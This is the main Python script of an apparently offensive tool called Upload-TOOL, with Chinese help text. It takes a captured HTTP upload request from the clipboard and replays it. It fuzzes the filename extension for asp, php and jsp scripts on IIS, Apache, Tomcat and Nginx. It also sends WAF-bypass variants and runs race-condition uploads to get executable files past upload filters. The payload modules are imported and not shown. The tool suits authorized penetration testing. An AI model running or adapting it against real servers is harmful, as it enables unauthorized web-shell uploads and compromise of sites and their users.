import pyperclip, argparse, re
import lib.HackRequests as HackRequests
import lib.race as race
import lib.waf as waf
import lib.filename as filename
import prettytable as pt

def upload_file(req, text):
    hack = HackRequests.hackRequests()
    upload_res = hack.httpraw(req)
    if text == '':
        success = -1
    elif text in upload_res.text():
        success = 1
    else:
        success = 0
    code = upload_res.status_code
    length = len(upload_res.text())
    return [success, code, length]
    


def banner():
    print("""
 _    _       _                 _     _______ ____   ____  _      
| |  | |     | |               | |   |__   __/ __ \ / __ \| |     
| |  | |_ __ | | ___   __ _  __| |______| | | |  | | |  | | |     
| |  | | '_ \| |/ _ \ / _` |/ _` |______| | | |  | | |  | | |     
| |__| | |_) | | (_) | (_| | (_| |      | | | |__| | |__| | |____ 
 \____/| .__/|_|\___/ \__,_|\__,_|      |_|  \____/ \____/|______|
       | |                                                        
       |_|  
                                Author: @fatekey                                              
    """)


def parse_args():
    parser = argparse.ArgumentParser(description='A auto upload fuzz tool')
    parser.add_argument('-l',
                        '--language',
                        dest='language',
                        choices=['asp', 'php', 'jsp', 'all'],
                        type=str,
                        default='all',
                        help='上传文件扩展名')
    parser.add_argument('-o',
                        '--os',
                        dest='os',
                        choices=['win', 'linux', 'all'],
                        type=str,
                        default='all',
                        help='目标操作系统')
    parser.add_argument('-m',
                        '--middleware',
                        dest='middleware',
                        choices=['iis', 'apache', 'tomcat', 'nginx'],
                        type=str,
                        default='all',
                        help='目标中间件类型')
    parser.add_argument('-a',
                        '--allow',
                        dest='allow_suffix',
                        type=str,
                        default='jpg',
                        help='允许上传的文件后缀')
    parser.add_argument('-u',
                        '--url',
                        dest='url',
                        type=str,
                        default='',
                        help='上传成功路径,用于检测是否上传成功')
    parser.add_argument('-t',
                        '--text',
                        dest='text',
                        type=str,
                        default='',
                        help='上传成功文本,用于检测是否上传成功')
    parser.add_argument('--mode',
                        dest='mode',
                        choices=['upload', 'waf', 'race', 'dic'],
                        type=str,
                        default='dic',
                        help='模式,upload:自动上传测试,waf:绕过waf,race:条件竞争,dic:导出字典到剪切板')
    return parser.parse_args()


if __name__ == '__main__':
    banner()
    args = parse_args()
    if args.mode == 'dic':
        filename_list = filename.get_filename(args.language, args.os,
                                              args.middleware,
                                              args.allow_suffix)
        pyperclip.copy('\n'.join(filename_list))
        print('[*] 字典已经复制到剪切板')
    else:
        paste = pyperclip.paste()
        paste = paste.replace('\r\n', '\n')
        
    if args.mode == 'upload':
        filename_list = filename.get_filename(args.language, args.os,
                                              args.middleware,
                                              args.allow_suffix)
        print('[*] 正在进行后缀名fuzz')
        table = pt.PrettyTable(['PAYLOAD',  'SUCCESS', 'CODE', 'LENGTH'])
        for f in filename_list:
            payload = 'test.' + f
            req = re.sub(r'filename=".*"', 'filename="%s"' % payload, paste, 1)
            result = upload_file(req, args.text)
            if result[0] == 1 or result[0] == -1:        
                success_str = {1: 'SUCCESS', -1: 'NOT SET'}[result[0]]
                table.add_row([f, success_str, result[1], result[2]])
        table = table.get_string(sortby='LENGTH')
        print(table)
    if args.mode == 'waf':
        print('[*] 正在进行waf绕过')
        table = pt.PrettyTable(['PAYLOAD',  'SUCCESS', 'CODE', 'LENGTH'])
        payload_list = waf.waf_bypass(paste)
        for payload in payload_list:
            req = payload[1]
            result = upload_file(req, args.text)
            if result[0] == 1 or result[0] == -1:        
                success_str = {1: 'SUCCESS', -1: 'NOT SET'}[result[0]]
                table.add_row([payload[0], success_str, result[1], result[2]])
        table = table.get_string(sortby='LENGTH')
        print(table)
    if args.mode == 'race':
        print('[*] 正在进行条件竞争上传')
        race.race(paste,args.url)
        